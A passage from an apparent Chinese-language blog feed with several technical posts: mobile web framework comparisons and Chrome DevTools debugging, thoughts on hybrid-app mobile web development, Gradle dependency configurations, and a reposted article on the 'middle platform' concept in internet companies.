jQuery Mobile 和 Sencha Touch 时需要考虑的一些关键差异：</p><ul><li><strong>看和感觉</strong> 一般来说，Sencha Touch 应用程序的外观和感觉比 jQuery Mobile 应用程序更清晰和优越，但重要的是要记住，这样的响应往往是高度主观的。</li><li><strong>可扩展性</strong> jQuery Mobile 提供了许多第三方扩展，并且本质上被设计为高度可扩展的，而 Sencha Touch 则更像是一个“封闭”框架。</li><li><strong>设备支持</strong> 与 Sencha Touch 相比，jQuery Mobile 面向更大范围的设备。</li><li><strong>HTML 与 JavaScrip</strong> jQuery 主要以 HTML 为中心（即在 JavaScript 中扩展和操作现有的 HTML），而 Sencha Touch 编码完全基于 JavaScript。 （顺便说一下，这是一个例子，说明为什么在选择技术时考虑开发团队的技能很重要。）</li><li><strong>外部依赖</strong> jQuery Mobile 需要 jQuery 和 jQuery UI 来进行 DOM 操作，而 Sencha Touch 没有外部依赖项。</li><li><strong>学习曲线</strong> 大多数开发人员发现 jQuery 的启动时间少于 Sencha Touch，这可能是由于大部分 Web 开发人员已经熟悉标准 jQuery 库。</li></ul><h1 id="Responsive-Frameworks-and-Mobile-Web-Applications"><a href="#Responsive-Frameworks-and-Mobile-Web-Applications" class="headerlink" title="Responsive Frameworks and Mobile Web Applications"></a>Responsive Frameworks and Mobile Web Applications</h1><p>有许多响应式框架可用，目前最流行的两个是 Bootstrap 和 Foundation。 简而言之，响应式框架简化了基于 Web 的响应式 UI 设计和实现，将最常见的布局和 UI 范例封装到一个可重用、性能优化的框架中。 这些框架大多基于 CSS 和 JavaScript，其中许多是开源的、免费下载且易于定制的。 除非您有一组非常特殊的要求，否则使用其中一个框架可能会减少设计和实现移动 Web 应用程序所需的工作量。</p><p>检查两个主要选项 Bootstrap 和 Foundation，需要考虑的一些关键差异包括：</p><ul><li><strong>目标平台</strong> 虽然 Bootstrap 确实支持移动设备、平板电脑和桌面设备，但它主要面向桌面使用。 另一方面，Foundation 专为各种屏幕尺寸和类型而设计。</li><li><strong>浏览器兼容性</strong> Bootstrap 和 Foundation 都支持大多数浏览器的最新版本。</li><li><strong>布局和组件的多样性</strong> Bootstrap 的 UI 元素集合比 Foundation 提供的要多得多。</li><li><strong>自动调整大小</strong> 使用 Foundation，网格会根据当前浏览器的高度和宽度进行收缩和拉伸，而 Bootstrap 仅支持基于一组标准屏幕尺寸的预定义网格尺寸集。</li></ul><h1 id="Debugging-and-Testing-Mobile-Web-Apps"><a href="#Debugging-and-Testing-Mobile-Web-Apps" class="headerlink" title="Debugging and Testing Mobile Web Apps"></a>Debugging and Testing Mobile Web Apps</h1><p>调试移动 Web 应用程序可能会很棘手并且有些令人沮丧，特别是如果您需要四处寻找不同的设备来测试或安装 SDK 以实现（通常不完美）目标客户端平台的仿真。</p><p>在这种情况下，移动 Web 开发（与原生应用程序开发相比）的一个明显优势是您可以利用标准的基于浏览器的开发人员工具来调试您的应用程序。 根据我个人对远程调试的偏好，我在本应用程序开发教程中推荐的是带有 DevTools 的 Chrome。 其他标准选项包括带有 Firebug 的 Firefox 或 Opera 的 Dragonfly 工具。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-4a5747fece9fedf8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>我喜欢 Chrome 及其 DevTools 的一些原因包括：</p><ul><li><strong>Chrome 的 DevTools 中的移动模拟器</strong> 仅这一点就可能是选择 Chrome 来调试移动 Web 应用程序的充分理由。 主要功能包括模拟触摸事件、用户代理欺骗、网络带宽限制、地理位置覆盖、设备方向覆盖和 CSS 媒体类型模拟。</li><li><strong>交互式编辑器</strong>  启用动态编辑 JavaScript 或 CSS 的能力。</li><li><strong>高级 JavaScript 调试器</strong> 允许 DOM 断点并提供分析 JavaScript 代码执行时间的能力。</li><li><strong>内置 JSON 和 XML 查看器</strong> 避免需要任何插件来检查服务器响应。</li><li><strong>直接通过 USB 支持 Android 调试桥 (ADB) 协议</strong> 便于远程调试会话的简单实例化。</li><li><strong>动态检查资源</strong> 允许您检查应用程序的本地数据源，包括 IndexedDB 或 Web SQL 数据库、本地和会话存储、cookie 和应用程序缓存资源。 您还可以快速检查应用程序的视觉资源，包括图像、字体和样式表。</li></ul><p>要测试 Web 应用的布局和跨浏览兼容性，您还可以使用一些有用的在线工具，例如 BrowserStack。 只需输入您的应用程序的 URL 并选择浏览器、版本和操作系统，您就会在该环境中获得站点的模拟视图（和加载速度）。 另一个用于此目的的有用工具是 BitBar。</p><h1 id="Choosing-Intelligent-Mobile-Development-Solutions"><a href="#Choosing-Intelligent-Mobile-Development-Solutions" class="headerlink" title="Choosing Intelligent Mobile Development Solutions"></a>Choosing Intelligent Mobile Development Solutions</h1><p>随着当今市场上和使用中的移动设备的数量、种类和复杂性的持续快速增长，对有效、用户友好、高性能的移动应用程序的需求可能会大幅增加。 能够智能高效地开发这些应用程序将继续至关重要。</p><p>在Mobile Web、 Native和Hybrid移动应用程序选项之间进行选择时，必须考虑许多因素。 每个都有自己的优势，但移动 Web 应用程序通常代表您最有效的开发（以及上市时间）选项。 如果您选择走这条路，我希望这个移动 Web 开发教程可以帮助您成功且最直接地到达目的地。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Mobile Web开发的思考</title>
      <link href="/2022/10/03/%E5%8E%9F%E5%88%9B-%E5%85%B3%E4%BA%8EMobile-Web%E5%BC%80%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2022/10/03/%E5%8E%9F%E5%88%9B-%E5%85%B3%E4%BA%8EMobile-Web%E5%BC%80%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<p>作为一名移动开发者，见证了公司的移动产品架构，从纯web 网页到native，再到hybrid的过程。hybrid 指app里一部分用native的代码实现，一部分用webview加载web 网页实现。越来越多的公司对移动app采用hybrid的开发模式，一是可以和pc端共享代码，节省资源，二是web部分有更新不用再次发布app就能实现。</p><p>对于hybrid app里的web开发，不是简单的把pc端的代码直接拿过来给hybrid app用。PC和mobile的设备有区别，这就需要我们在为二者实现web端时关注的重点不同。以下是我对mobile web开发的一点思考。</p><h1 id="1-界面布局，-css设置"><a href="#1-界面布局，-css设置" class="headerlink" title="1. 界面布局， css设置"></a>1. 界面布局， css设置</h1><p>mobile设备屏幕较小，这就意味着我们不能用pc端设置界面的思维来设计mobile的界面。mobile屏幕上只能放有限的内容，而且内容大小要易于手指操作，比如点击，滑动等等。如果要适配多种mobile 设备，那就需要界面设计师设计出能在一定范围内动态调整的界面。除此之外，mobile设备可以旋转，对于竖屏和横屏的界面，可能得设计出两套展示方案。</p><h1 id="2-用户操作"><a href="#2-用户操作" class="headerlink" title="2. 用户操作"></a>2. 用户操作</h1><p>pc端的用户操作是通过鼠标完成： 单击， 双击，右键等，对应web的处理事件是pointer event。而mobile的操作是通过手指完成：点击，长按，滑动等，对应的web处理事件是touch event。 这二者之间有可以共用的部分： 比如pc端的单击操作，在mobile端通过手指点击也能触发。 而对于mobile端的滑动手势，需要mobile端去额外处理。<br>综上所述，mobile web需要处理手势操作。</p><h1 id="3-性能"><a href="#3-性能" class="headerlink" title="3. 性能"></a>3. 性能</h1><p>pc 端和mobile端不同，除了屏幕大小以外， 还包括内存，处理器的区别。在pc端一个应用程序可以占用很多的内存，有的web app甚至能达到1-2G左右的内存。但在mobile端，一个app如果占用1-2G的内存是不可取的，容易导致mobile 设备卡顿，app被系统杀掉等。因此，对于mobile web，需要对性能进行优化，使用懒加载技术，严格限制内存使用，</p><p> web app是先请求静态资源比如js， css 文件，然后再执行js代码来加载数据渲染网页。在mobile中， app的启动速度对于用户体验十分重要，hybrid app中的web部分，如果静态资源过大，或导致加载速度过慢。这就需要我们启动的js ， css 文件尽量缩小，加快mobile web的启动速度。即使我们把静态资源绑定在app中发布，也可能遇到服务器升级，而用户未及时升级app的情况。</p><h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><p>对于mobile web的开发，我们需要从界面， 用户操作，性能等方面进行考虑。欢迎留言探讨。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gradle依赖之‘五种依赖配置’</title>
      <link href="/2022/09/25/Gradle%E4%BE%9D%E8%B5%96%E4%B9%8B%E2%80%98%E4%BA%94%E7%A7%8D%E4%BE%9D%E8%B5%96%E9%85%8D%E7%BD%AE%E2%80%99/"/>
      <url>/2022/09/25/Gradle%E4%BE%9D%E8%B5%96%E4%B9%8B%E2%80%98%E4%BA%94%E7%A7%8D%E4%BE%9D%E8%B5%96%E9%85%8D%E7%BD%AE%E2%80%99/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://zhuanlan.zhihu.com/p/110215979">Gradle依赖之‘五种依赖配置’</a></p><p>目前gradle支持的依赖配置有五种，分别是implementation, api, compileOnly, runtimeOnly和annotationProcessor。常用的依赖配置是implementation, api和compileOnly。</p><h1 id="1-第一种：implementation"><a href="#1-第一种：implementation" class="headerlink" title="1. 第一种：implementation"></a>1. 第一种：implementation</h1><p>会将指定的依赖添加到编译路径，并且会将该依赖打包到输出，如apk中，但是这个依赖在编译时不能暴露给其他模块，例如依赖此模块的其他模块。这种方式指定的依赖在编译时只能在当前模块中访问。</p><p>当前项目中有两个模块app和decoder<br><img src="https://upload-images.jianshu.io/upload_images/15531792-89028094470023c6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>模块app依赖模块decoder</p><p>decoder中添加了远程二进制库依赖joda-time</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-1acb2b6a079f8cd5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>在decoder模块中使用这个库</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-a1ce8253c9697bf0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>在app模块中条用decoder模块提供的方法</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-6bea484f61e466e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>尝试在app模块中使用joda-time库</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-3a08105370a5e73a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>出现错误：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-86afca9c943ae077.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>从上面的例子中我们可以看出，complementation依赖设置表示当前这个依赖在编译时只能在当前这个模块中访问，其他模块在编译时不能访问，依赖这个模块的其他模块在运行时可以访问这个库的实现。</p><h1 id="2-第二种：api"><a href="#2-第二种：api" class="headerlink" title="2. 第二种：api"></a>2. 第二种：api</h1><p>使用api配置的依赖会将对应的依赖添加到编译路径，并将依赖打包输出，但是这个依赖是可以传递的，比如模块A依赖模块B，B依赖库C，模块B在编译时能够访问到库C，但是与implemetation不同的是，在模块A中库C也是可以访问的。</p><p>我们修改decoder模块中对joda-time库的依赖配置</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-6b8b16b1e48231d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>在app模块中使用joda-time库</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-63f502c097b7d750.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>输出<br><img src="https://upload-images.jianshu.io/upload_images/15531792-e079d32594c9bfc9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="3-第三种：compileOnly"><a href="#3-第三种：compileOnly" class="headerlink" title="3. 第三种：compileOnly"></a>3. 第三种：compileOnly</h1><p>compileOnly修饰的依赖会添加到编译路径中，但是不会打包到apk中，因此只能在编译时访问，且compileOnly修饰的依赖不会传递。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-257d30df624ef83b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>编译时通过，运行时报错：</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-9df7b40622c6f079.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>由于写Android的时间比较短，不知道这个配置的具体应用场景，希望有经验的大佬能够在评论区回复一下具体的应用场景。</p><h1 id="4-第四种：runtimeOnly"><a href="#4-第四种：runtimeOnly" class="headerlink" title="4. 第四种：runtimeOnly"></a>4. 第四种：runtimeOnly</h1><p>这个与compileOnly相反，它修饰的依赖不会添加到编译路径中，但是被打包到apk中，运行时使用。没有使用过。</p><h1 id="5-第五种：annotationProcessor"><a href="#5-第五种：annotationProcessor" class="headerlink" title="5. 第五种：annotationProcessor"></a>5. 第五种：annotationProcessor</h1><p>用于注解处理器的依赖配置，还没有使用过。</p><p>除了上面五种，还有两种testImplementation和androidTestImplementation两种，用于指定在测试代码的依赖。</p><p>对于上面这么多的依赖，其中Implementation是我们最常用的依赖配置选项。</p><p><a href="https://developer.android.com/studio/build/dependencies?hl=zh-cn">官方文档</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>互联网公司中所谓中台是怎么定义的？</title>
      <link href="/2022/09/11/%E4%BA%92%E8%81%94%E7%BD%91%E5%85%AC%E5%8F%B8%E4%B8%AD%E6%89%80%E8%B0%93%E4%B8%AD%E5%8F%B0%E6%98%AF%E6%80%8E%E4%B9%88%E5%AE%9A%E4%B9%89%E7%9A%84%EF%BC%9F/"/>
      <url>/2022/09/11/%E4%BA%92%E8%81%94%E7%BD%91%E5%85%AC%E5%8F%B8%E4%B8%AD%E6%89%80%E8%B0%93%E4%B8%AD%E5%8F%B0%E6%98%AF%E6%80%8E%E4%B9%88%E5%AE%9A%E4%B9%89%E7%9A%84%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://www.zhihu.com/question/57717433">互联网公司中所谓中台是怎么定义的？</a><br>大约从去年年底(2018)开始，中台的概念开始被广泛讨论。</p><p>但与此同时，关于中台究竟是什么，却是众说纷纭。引用王健老师在《<a href="https://www.zhihu.com/search?q=%E5%BD%93%E6%88%91%E4%BB%AC%E8%B0%88%E4%B8%AD%E5%8F%B0%E6%97%B6%EF%BC%8C%E6%88%91%E4%BB%AC%E5%9C%A8%E8%B0%88%E4%BA%9B%E4%BB%80%E4%B9%88%7C+%E7%99%BD%E8%AF%9D%E4%B8%AD%E5%8F%B0%E6%88%98%E7%95%A5&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:719218827%7D">当我们谈中台时，我们在谈些什么| 白话中台战略</a>》一文中提到的关于中台的一些理解，就能看出一些端倪。</p><blockquote><p>在有些人眼里：中台就是技术平台，像微服务开发框架、Devops平台、PaaS平台，容器云之类的，人们都叫它<strong>“技术中台”</strong>。<br>在有些人眼里：中台就是微服务业务平台，像最常见的什么用户中心，订单中心，各种微服务集散地，人们都叫它<strong>“业务中台”</strong>。<br>在有些人眼里：中台应该是组织的事情，在释放潜能：类似于企业内部资源调度中心和内部创新孵化组织，人们叫它<strong>“组织中台”</strong>。</p></blockquote><p>这些理解都对，但也都有不够准确或不够完整的部分。中台，作为一个还在被定义当中的概念，正处在一个大家都有感觉，但又难以被定义的状态。而且可预见的是，这种相对模糊的状态可能还要维持相当长的一段时间。</p><p>与此同时，在查阅了大量资料、并与京东等大厂的中台相关负责人沟通后，我们发现，目前行业内对于中台讨论的视角还是多偏于战略或组织架构层面，而<strong>中台更多是因为公司业务在发展到某一阶段时，遇到瓶颈与障碍后，为解决实际问题而提出的解决方案</strong></p><p>虽然基于战略的角度去看，确实能够让大家视野开阔，从更高维度理解中台。但战略是基于实际业务而制定的，如果撇开业务去空谈，就如同空中楼阁，还是无法了解中台到底是什么。接下来，我们将会站在实际业务的角度，探讨一下中台的“前世今生”，以及如果想要成为一个中台产品经理，你应该具备哪些能力。</p><h1 id="01-为什么需要中台？"><a href="#01-为什么需要中台？" class="headerlink" title="01 为什么需要中台？"></a>01 为什么需要中台？</h1><p>市面上讲到中台，一定会提到两个例子，一个是13年马云参观supercell，然后在15年确定了阿里的中台战略；另一个是华为的中台战略转型，也就是那句著名的“让听得见炮火的人指挥战斗”。</p><p>这似乎会给大家一个错觉，似乎中台是一种自上而下的战略选择。老板觉得中台好，所以要搭建中台。</p><p>不过，现实情况，或许与绝大多数人想象不太一样，<strong>中台的产生，并非完全是自顶向下的战略设计，也并非是为了追随某种行业风口，而是随着公司业务高速发展、组织不断膨胀的过程中暴露的种种问题需要被解决。</strong>而这时，中台的概念恰好对应了这个问题，所以大家接受了中台。</p><p>过去几年中，借着移动互联网的红利，许多公司都高速发展，进行大规模业务拓展，业务拓展的速度足够快，对公司自然是好事，但是随着而来的问题就是，公司内部出现了大量的重复建设和资源浪费的现象。阿里的共享服务部发展历程就是如此。</p><p>公司刚开始只有淘宝，后来意识到B2C模式的业务也会是电商领域重要的组成部门，所以出现了天猫，随着天猫的不断发展，逐渐独立成一个部门，但是这两套都包含订单、商品、库存、价格、仓储、物流等基本业务系统。这两个系统互相独立，各自运行。</p><p>等到10年左右，阿里开始上线1688、聚划算等业务的时候发现，这些业务针对的领域虽然各不相同，但是他需要用到的系统功能也高度类似，主要也是订单、商品、库存、价格、仓储、物流等系统。如果这些新业务的系统也都要全部重新开发一遍，这无疑是很大的资源浪费。明明既有的系统调整一下就可以满足新业务的需求，为什么还要继续开发新系统呐？</p><p>在这个大的背景之下，阿里内部将共享服务部的职权不断提升，统一将各个业务业务部门重复使用，反复建设的功能和系统统一规划和管理。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-55141a7216c22c68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>其实，很多公司的中台部门，或者平台业务部门的出现都有类似的背景和情况。</p><p>比如说，滴滴在15年末开始启动自己的中台战略，这与滴滴当时的业务发展阶段也是相关的。</p><p>2015 年末，滴滴在短时间内形成了包括快车、出租车、专车、顺风车、代驾等多业务的<a href="https://www.zhihu.com/search?q=%E5%9E%82%E7%9B%B4%E5%8C%96&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:719218827%7D">垂直化</a>架构。</p><p>这些业务虽然会有一些差别，但是核心系统和流程都是类似的。如果各自独立开发，也会出现各种各样的问题。</p><p>比如说，开发成本过高，滴滴旗下的每个业务，其实都是可以单独支撑起一家公司的，如果每个业务都独立做到极致，那么开发成本和人力成本就会非常巨大，而如果为了控制成本，就把系统的建设放缓，则意味着，无论是核心系统本身的质量，还是对外的用户体验都不太好。</p><p>在这样的背景下，滴滴也开始考虑将诸多业务，以及各个城市的系统统一规划，统一建设，提升服务前台的能力。</p><p>其实，刚刚我们提到的，以及许多正在实践中台业务的公司，都有类似的问题，这些问题，大约会是两类——</p><p><strong>一类是，许多业务需求或功能需求高度类似、通用化程度很高，但是由于没有专门的团队负责规划和开发，大量的系统重复开发、重复建设，导致<a href="https://www.zhihu.com/search?q=%E5%A4%8D%E7%94%A8%E6%80%A7&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:719218827%7D">复用性</a>低、效率低、产研资源浪费、用户体验不统一。</strong></p><p>另一类是，早期业务发展过程中，为了解决一些当下的业务问题，垂直的、个性化的业务逻辑与基础系统耦合太深，<strong>由于没有平台性质的规划，横向系统之间、上下游系统之间的交叉逻辑也非常多，这样导致在新业务、新市场的拓展过程中，系统没法直接复用，甚至没法快速迭代。</strong></p><p>这两类问题，在软件开发领域，有专门的名称，叫做“重复造轮子”和“烟囱式架构”。这两类问题本质上是企业在发展过程当中，为了解决当下的业务问题，快速上线了很多功能，而欠下了许多技术债，当企业进入成熟期之后，发现这些问题的存在，严重影响了企业的运行效率和运营成本。</p><p>如何能够<a href="https://www.zhihu.com/search?q=%E6%9C%BA%E5%88%B6%E5%8C%96&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:719218827%7D">机制化</a>，产品化地解决这些问题，能够更好地通过产品的形式，将企业内部具有很强的通用性的数据、功能、产品甚至经验进行统一规划和开发，进而更好地帮助前台业务部门更多地关注业务，提高业务运营效率，进而提升企业竞争力，是企业开发中台的基本出发点。</p><p>现阶段，大多数提出中台战略或是建设大中台的公司，大多都有类似的困境。业务高速发展多年，许多问题积重难返或者大量在解决“重复造轮子”的问题，中台这个概念，很多情况下是因为契合了大公司业务的发展的情况，而被大家广泛认可。</p><h1 id="02-中台能解决什么问题？"><a href="#02-中台能解决什么问题？" class="headerlink" title="02 中台能解决什么问题？"></a>02 中台能解决什么问题？</h1><p>前面的内容，我们大致介绍了中台要解决的问题。这给我们一种感觉是，中台是只有大公司才能做的事情，因为毕竟只有大公司在会有这种多条业务线，需要大量通用功能的场景，也只有只有大公司有能力拿出如此大的资源打造个中台。</p><p>现实情况也如我们所说，<strong>很多公司的中台业务，实际业务发展到一定阶段，进入一个瓶颈之后，为了能够应对接下来的问题，才一点一点从内部开始推动解决之前的问题。</strong></p><p>但这其实只是中台建设的一个层面。</p><p>中台作为一种产品设计思路，或者系统架构思路，并不受限于公司的规模，理论上讲，任何一家即将或者正在面临业务高速增长的状态时，都很值得利用和借鉴中台的思路，将目前业务当中大量可复用的功能和场景进行梳理，为业务的高速增长做好准备。</p><p>这在中小公司当中，是有现实意义的。</p><p>对于很多中小公司，当他们走出生存困境，进入到高速发展阶段时，会遇到很多的问题，但大概率会遇到的一个问题是，<strong>过往的业务模型，产品能力很有可能没法完全承接住大规模用户增长带来的压力。</strong></p><p>而当你具体到每个用户的时候，你又能发现，他们遇到的问题你之前都遇到过，只不过，因为一下来的太多，你没法像过去一样提供达预期，甚至超预期的服务时，对方就会产生不满。</p><p>这也是为什么许多公司会生于拉新，死于留存的一个原因。</p><p>很多公司在这个阶段的选择都是为了临时解决一个问题，快速上线一个功能，也不是不可以，只不过，很有可能你的解决方案会不断带来新的问题，最后陷入到功能太过复杂，以至于积重难返的地步</p><p>所以，在有可能的情况下，公司将一些大概率长期有价值的功能，专门模块化，进行开发和优化，确保即使业务规模进一步扩大，也能够满足业务需求。甚至，随着能力或方法论的不断优化，甚至有可能某一天成为整个行业的方法论。</p><p>这个过程，就很像是在高速飞行过程中修飞机一样。一方面，机翼已经千疮百孔，摇摇欲坠，另一方面，发动机还在运转，你还能往前飞，但你知道，如果再进入到下一场战斗，你不见得还能确保飞机不会坠落，所以，必须抢在下一次战斗前把飞机修好。</p><p>随着业务的发展，你对飞机的要求，也不仅仅是修好，可能会希望，能够提前预防一些问题。或者，知道你的飞机哪里战斗力最强，就把哪里做到最好。或许，就能够回避之后的一些问题。</p><p>这或许是中台这个概念，对于中小公司内部产品规划的一个启发。</p><p>当然，需要提示的一点是，对于中小公司而言，中台的理念不见得是单独拉几十人搭建一个中台产研团队，可以将一些关键流程先行标准化，把一些反复出现的场景当中的解决方案进行沉淀，部分需要产品化的功能先行<a href="https://www.zhihu.com/search?q=%E4%BA%A7%E5%93%81%E5%8C%96&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:719218827%7D">产品化</a>，可能对于一家业务刚刚开始起步的公司来说，就已经很重要了。</p><h1 id="03-中台产品经理的挑战"><a href="#03-中台产品经理的挑战" class="headerlink" title="03 中台产品经理的挑战"></a>03 中台产品经理的挑战</h1><p>之前的内容，我们其实花了很大的篇幅来讨论，为什么会有中台，中台解决怎样的问题，以及中台适用怎样的场景。</p><p>但是，具体到业务场景当中，中台产品经理又在做什么事情，解决怎样的问题？如果想要成为一名优秀的中台产品经理，又会遇到怎样的困难和挑战？</p><p>我们采访了一些大公司的中台部门之后，会发现，中台产品经理面对很多挑战，其中，最主要要是最困难的挑战，主要集中在这样两个方面。</p><p><strong>一方面，是思维的差异。</strong></p><p>很多产品经理并不是从一开始就从事中台相关的事宜，也不是一开始就有中台这样的定位。更多情况下，他们是从前台业务部门，或者以业务为导向的产研部门转型到中台产研部门。</p><p>这时，其实要面临很大的思维方式、做事方法的转变。</p><p>在业务部门或者以业务为导向的产研部门，最核心的目的就是达成业务目标，要求你速度足够快、功能高效地解决当下的业务问题，当前业务发展的效率是最关键的。</p><p>至于说，这个功能将来有没有可能适用于别的场景，有没有可能解决别的问题，这个问题实在是没那么重要。</p><p>但是，对于中台不能如此。</p><p><strong>对于中台产品经理来说，必须思考的问题是，这个功能在现在或者将来能满足多少业务场景？如果将来有新的业务出现，是不是能够复用？或者说，需要做多大的调整才可以复用？甚至于，这个功能有没有可能对外输出，提供<a href="https://www.zhihu.com/search?q=SaaS%E5%8C%96&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:719218827%7D">SaaS化</a>的服务。</strong></p><p>这些问题，是中台部门需要思考的问题。这是思维上的差异。</p><p><strong>另一方面，是环境的变化。</strong></p><p>当你在业务部门的时候，响应业务是相对轻松的。但是，在中台部门，响应多个业务，就没有那么轻松了。</p><p>就拿需求调研为例。在业务部门或以业务为导向的产研部门的时候，你只要和对接的业务人员沟通清楚需求就OK了，毕竟，你只要了解这一个或对应的多个部门的业务需求即可，业务目标相对比较明确。</p><p>但是，当你需要响应多个业务部门的时候，就没有那么容易了。</p><p>你会发现，同样一个需求，A部门的流程和B部门流程完全不同，或者，流程是相似的，但到具体细节的时候，却有很大差异。</p><p>更可怕的是，同样一个问题，由于业务的发展阶段不同，对于问题的态度也全然不同：有的部门业务已经非常成熟，自己流程也很清晰，所以不太希望你来调整他们现有的流程；但是，有的部门还处于探索期，还没有遇到你提出的问题，可能压根就不理你。这时，对于中台产品经理的挑战就非常大。</p><p>他们可能会将大量的精力耗散于不同部门之间的沟通协调，反复对同一个需求进行确认，很长时间没有明显突破。这个时候，<strong>就要求中台产品经理有很强的沟通、协调和协作能力。</strong></p><p>并且，因为他们接下来要做的解决方案，是要服务于多个业务。这个时候，<strong>需要中台产品经理有很强的逻辑思考能力，看到不同需求之间的共性需求，并提炼出一个产品化的解决方案。</strong></p><p>甚至于，对于一些尚未遇到这个问题的业务部门，可能还要帮他们前置地思考解决方案。</p><p>这又很要求产品经理的逻辑思考和抽象思考能力。</p><p><strong>既需要沟通协作的软技能，又需要逻辑抽象的硬思考，这可能才是中台产品经理最有挑战的地方。</strong></p><p>虽然有挑战，但是也不见得没有方法。对于中台产品经理来说，刚刚我们提到的内容，也只是帮助中台产品经理，对于中台产品这个岗位所要面临的挑战和工作，能够有一些初步框架性的理解。</p><p>但是，在实际业务场景当中要解决的很多复杂问题，受限于篇幅，我们还没有详细讨论。</p><p>对于中台产品而言，他们的能力要求其实跨越非常大。<strong>一方面，需要极强的逻辑思维和战略分析能力，能够看到业务当中的关键流程，理解业务接下来的发展方向，并将其转化为产品功能，与研发一起实现。另一方面，又需要极强的沟通和交流能力，能够在与多个<a href="https://www.zhihu.com/search?q=%E4%B8%9A%E5%8A%A1%E7%BA%BF&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:719218827%7D">业务线</a>，需求、背景、想法各不相同的相关方一起，推动完成相关功能的实现。</strong></p><p>这背后，是技术，也是艺术。</p><p>某种意义上，能够掌握掌握这两种似乎有些对立思维，并能够灵活运用，可能距离成为一个优秀的中台产品经理，就不太远了。</p><p>最后，如果你想了解更多关于产品经理的干货和内容，欢迎关注  <a href="https://www.zhihu.com/people/b7e359ea6cd2eac48bd37f8917c50825">@三节课</a>  ！<br>如果觉得内容对你有帮助，欢迎点个赞，比心心～❤️</p>]]></content>
      
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>超详细的jenkins持续集成工作原理、功能、部署方式等介绍</title>
      <link href="/2022/09/11/%E8%B6%85%E8%AF%A6%E7%BB%86%E7%9A%84jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E3%80%81%E5%8A%9F%E8%83%BD%E3%80%81%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E7%AD%89%E4%BB%8B%E7%BB%8D/"/>
      <url>/2022/09/11/%E8%B6%85%E8%AF%A6%E7%BB%86%E7%9A%84jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E3%80%81%E5%8A%9F%E8%83%BD%E3%80%81%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E7%AD%89%E4%BB%8B%E7%BB%8D/</url>
      
